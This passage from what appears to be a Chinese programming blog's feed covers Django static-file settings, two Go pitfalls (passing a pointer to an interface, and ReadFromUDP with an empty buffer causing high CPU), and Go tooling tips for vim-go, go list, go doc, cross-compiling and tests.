&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;STATIC_URL&lt;/td&gt;
&lt;td&gt;用户通过web访问静态文件时的URL前缀部分&lt;/td&gt;
&lt;td&gt;STATIC_URL=&amp;quot;/static/&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;STATIC_ROOT&lt;/td&gt;
&lt;td&gt;manager.py collectstatic执行后静态文件会收集存放到&lt;/td&gt;
&lt;td&gt;STATIC_ROOT = os.path.join(BASE_DIR, &amp;lsquo;collected_static&amp;rsquo;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;STATICFILES_DIRS&lt;/td&gt;
&lt;td&gt;每个app目录中可以创建一个static目录存放对应的静态文件，也可以通过在settings文件中指定STATICFILES_DIRS来指定一个公共的位置存放静态文件&lt;/td&gt;
&lt;td&gt;&lt;br&gt;STATICFILES_DIRS = (&lt;/br&gt;    os.path.join(BASE_DIR, &amp;ldquo;common_static&amp;rdquo;),&lt;/br&gt;    &amp;lsquo;/path/to/others/static/&amp;rsquo;,  # 指定一个目录&lt;/br&gt;)&lt;/br&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;STATICFILES_FINDERS&lt;/td&gt;
&lt;td&gt;指定静态文件查找器&lt;/td&gt;
&lt;td&gt;STATICFILES_FINDERS = (&lt;/br&gt;    &amp;ldquo;django.contrib.staticfiles.finders.FileSystemFinder&amp;rdquo;,&lt;/br&gt;    &amp;ldquo;django.contrib.staticfiles.finders.AppDirectoriesFinder&amp;rdquo;&lt;/br&gt;)&lt;/br&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DEBUG&lt;/td&gt;
&lt;td&gt;如果指定&amp;rsquo;DEBUG=True&amp;rsquo;，那么Django通过STATICFILES_FINDERS指定的查找器寻找静态文件。如果指定&amp;rsquo;DEBUG=False&amp;rsquo;，那么Django不会负责静态文件访问服务，这时可以通过apache或者nginx提供静态文件服务，访问前一般通过&amp;rsquo;collectstatic&amp;rsquo;把项目静态文件收集好后统一部署。&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</description>
    </item>
    
    <item>
      <title>Go语言编程陷阱</title>
      <link>/2017/11/go%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1/</link>
      <pubDate>Tue, 14 Nov 2017 00:55:51 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/go%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1/</guid>
      <description>&lt;h2 id=&#34;陷阱1-is-pointer-to-interface-not-interface&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%99%b7%e9%98%b11-is-pointer-to-interface-not-interface&#34;&gt;
        #
    &lt;/a&gt;
    陷阱1: &amp;ldquo;is pointer to interface, not interface&amp;rdquo;
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;执行下面代码会出现&amp;quot;type *net.Conn is pointer to interface, not interface)&amp;ldquo;错误，原因是因为&amp;quot;net.Conn&amp;quot;是interface而不是struct，不能用指针方式传递。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;8
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;connHandler&lt;/span&gt;(client &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;net.Conn) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// do something
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;somefunc&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// ...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;		client, _ &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; listener.&lt;span style=&#34;color:#06287e&#34;&gt;Accept&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#06287e&#34;&gt;connHandler&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt;client)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;GO语言中interface是一种特殊的数据结构，包含两部分内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个指向方法表的指针&lt;/li&gt;
&lt;li&gt;一个指向实际数据的指针&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://i.stack.imgur.com/5c0TS.png&#34; alt=&#34;interface&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为这种特殊的数据结构所以interface的指针指向的结构既没有实际数据也没有对应方法，那么就无法直接访问所需的内容，鉴于此原因我推测GO语言的开发者直接屏蔽掉了指向interface指针的用法。这种情况的正确如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;8
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;connHandler&lt;/span&gt;(client net.Conn) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// do something
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;somefunc&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// ...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;		client, _ &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; listener.&lt;span style=&#34;color:#06287e&#34;&gt;Accept&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#06287e&#34;&gt;connHandler&lt;/span&gt;(client)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&#34;陷阱2-netreadfromudp-未-block导致高cpu占用&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%99%b7%e9%98%b12-netreadfromudp-%e6%9c%aa-block%e5%af%bc%e8%87%b4%e9%ab%98cpu%e5%8d%a0%e7%94%a8&#34;&gt;
        #
    &lt;/a&gt;
    陷阱2: &amp;ldquo;net.ReadFromUDP 未 block导致高CPU占用&amp;rdquo;
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;在做UDP服务器端开发时需要用到net.ReadFromUDP()来获取客户端发送来的数据，根据这个函数定义需要传入一个&amp;rsquo;[] byte&amp;rsquo;的参数用于接收客户端数据。如果此处传入的参数是一个长度为0的slice的话就会导致CPU占满的问题。&lt;/p&gt;
&lt;p&gt;函数定义：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; (c &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;UDPConn) &lt;span style=&#34;color:#06287e&#34;&gt;ReadFromUDP&lt;/span&gt;(b []&lt;span style=&#34;color:#902000&#34;&gt;byte&lt;/span&gt;) (&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;UDPAddr, &lt;span style=&#34;color:#902000&#34;&gt;error&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ReadFromUDP acts like ReadFrom but returns a UDPAddr.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;问题代码：
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; data []&lt;span style=&#34;color:#902000&#34;&gt;byte&lt;/span&gt;                               &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// create a slice with length of 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;n, remoteAddr, err &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; conn.&lt;span style=&#34;color:#06287e&#34;&gt;ReadFromUDP&lt;/span&gt;(data)  &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// the call will return as soon as it&amp;#39;s called
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Error read UDP:&amp;#34;&lt;/span&gt;, err.&lt;span style=&#34;color:#06287e&#34;&gt;Error&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;正确代码：
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; data = &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;([]&lt;span style=&#34;color:#902000&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;1024&lt;/span&gt;)                 &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// make([]byte, 0, 1024) doesn&amp;#39;t work either
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;n, remoteAddr, err &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; conn.&lt;span style=&#34;color:#06287e&#34;&gt;ReadFromUDP&lt;/span&gt;(data)  &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// the call will block until there is data
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Error read UDP:&amp;#34;&lt;/span&gt;, err.&lt;span style=&#34;color:#06287e&#34;&gt;Error&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>GO开发技巧</title>
      <link>/2017/11/go%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Fri, 10 Nov 2017 20:37:07 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/go%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7/</guid>
      <description>&lt;h2 id=&#34;1-设置go语言vim开发环境&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e8%ae%be%e7%bd%aego%e8%af%ad%e8%a8%80vim%e5%bc%80%e5%8f%91%e7%8e%af%e5%a2%83&#34;&gt;
        #
    &lt;/a&gt;
    1. 设置GO语言vim开发环境
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;在vim中开发GO最好安装相关的插件，比如&lt;a href=&#34;https://github.com/fatih/vim-go&#34;&gt;vim-go&lt;/a&gt;这个插件。这个插件除了提供格式化、语法高亮、语法检测等功能以外还有很多方便的功能。&lt;/p&gt;
&lt;p&gt;编译命令，对应go build：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoBuild
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装，对应go install：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoInstall
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试，对应go test：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoTest
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行一个单独测试：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoTestFunc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;覆盖率：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoCoverage
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行当前程序，对应go run:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoRun
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;goto符号定义：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoDef
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;文档查询：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoDoc
:GoDocBrowser
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;添加／删除包引用：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoImport
:GoDrop
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置GOPATH：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoPath
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在结构体增加／删除tag：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoAddTags
:GoRemoveTags
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;静态语法检查：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoMetaLinter		// 调用gometalinter
:GoLint			// 调用golint
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;高级代码分析：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoImplements
:GoCallees
:GoReferrers
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重命名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:GoRename
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;在vim中查询vim-go的帮助文档&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%9c%a8vim%e4%b8%ad%e6%9f%a5%e8%af%a2vim-go%e7%9a%84%e5%b8%ae%e5%8a%a9%e6%96%87%e6%a1%a3&#34;&gt;
        ##
    &lt;/a&gt;
    在vim中查询vim-go的帮助文档：
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;:help vim-go
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装完成后打开vim，运行&amp;quot;:GoInstallBinaries&amp;quot;安装依赖的工具。&lt;/p&gt;
&lt;p&gt;再安装其它依赖工具：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// gocode is used by many editors to provide intellisense
go get github.com/nsf/gocode

// goimports is something you should run when saving code to fill in import paths
go get golang.org/x/tools/cmd/goimports

// gorename is used by many editors to provide identifier rename support
go get golang.org/x/tools/cmd/gorename

// oracle is a tool that help with code navigation and search
go get golang.org/x/tools/cmd/oracle

// golint should be run after every build to check your code
go get github.com/golang/lint/golint
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;2-其它常用工具&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-%e5%85%b6%e5%ae%83%e5%b8%b8%e7%94%a8%e5%b7%a5%e5%85%b7&#34;&gt;
        #
    &lt;/a&gt;
    2. 其它常用工具
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;文件格式化&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%96%87%e4%bb%b6%e6%a0%bc%e5%bc%8f%e5%8c%96&#34;&gt;
        ##
    &lt;/a&gt;
    文件格式化
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;gofmt &amp;lt;file&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;打印package信息&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%89%93%e5%8d%b0package%e4%bf%a1%e6%81%af&#34;&gt;
        ##
    &lt;/a&gt;
    打印package信息
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;查询当前目录模块信息：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  go list
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查询指定模块：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  go list &amp;lt;module&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;常用命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  go list -f &#39;{{ .Name }}&#39;

  go list -f &#39;{{ .Name }}: {{ .Doc }}&#39;

  go list -f &#39;{{ .Imports }}&#39;  // 结果用中括号输出

  $ go list -f &#39;{{.Imports}}&#39; fmt
  [errors io math os reflect strconv sync unicode/utf8]

  go list -f &#39;{{ join .Imports &amp;quot;\n&amp;quot;}}&#39;  // 结果用换行输出

  $ go list -f &#39;{{join .Imports &amp;quot;\n&amp;quot;}}&#39; fmt
  errors
  io
  math
  os
  reflect
  strconv
  sync
  unicode/utf8
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;跨平台编译&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%b7%a8%e5%b9%b3%e5%8f%b0%e7%bc%96%e8%af%91&#34;&gt;
        ##
    &lt;/a&gt;
    跨平台编译：
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;GOOS=windows go build
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;查询文档&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%9f%a5%e8%af%a2%e6%96%87%e6%a1%a3&#34;&gt;
        ##
    &lt;/a&gt;
    查询文档
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;查询当前模块：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  go doc
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查询指定模块：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  go doc \&amp;lt;module\&amp;gt;
  go doc \&amp;lt;module\&amp;gt; [function]
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在线文档：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  godoc -http :8080
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;程序错误查询&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a8%8b%e5%ba%8f%e9%94%99%e8%af%af%e6%9f%a5%e8%af%a2&#34;&gt;
        ##
    &lt;/a&gt;
    程序错误查询
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;程序执行的时候有些情况下不会打印错误信息，因为go中没有exception，当错误出现时是通过返回error来捕捉错误信息，如果程序执行的时候没有捕捉错误信息，那么就会出现这种状况。对于这种状况可以通过命令&amp;quot;errcheck&amp;quot;来获得错误信息。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;命令：
errcheck
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;go-vet工具&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#go-vet%e5%b7%a5%e5%85%b7&#34;&gt;
        ##
    &lt;/a&gt;
    go vet工具
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;go vet工具用来检查程序中可能的错误。&lt;/p&gt;
&lt;h2 id=&#34;3-测试&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3-%e6%b5%8b%e8%af%95&#34;&gt;
        #
    &lt;/a&gt;
    3. 测试
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;如何添加测试&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%a6%82%e4%bd%95%e6%b7%bb%e5%8a%a0%e6%b5%8b%e8%af%95&#34;&gt;
        ##
    &lt;/a&gt;
    如何添加测试
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;通常在被测试的程序文件同目录下添加&amp;rsquo;_test.go&amp;rsquo;结尾的文件，例如当要测试&amp;rsquo;program.go&amp;rsquo;时在同一个目录下添加&amp;rsquo;program_test.go&amp;rsquo;文件。&lt;/p&gt;
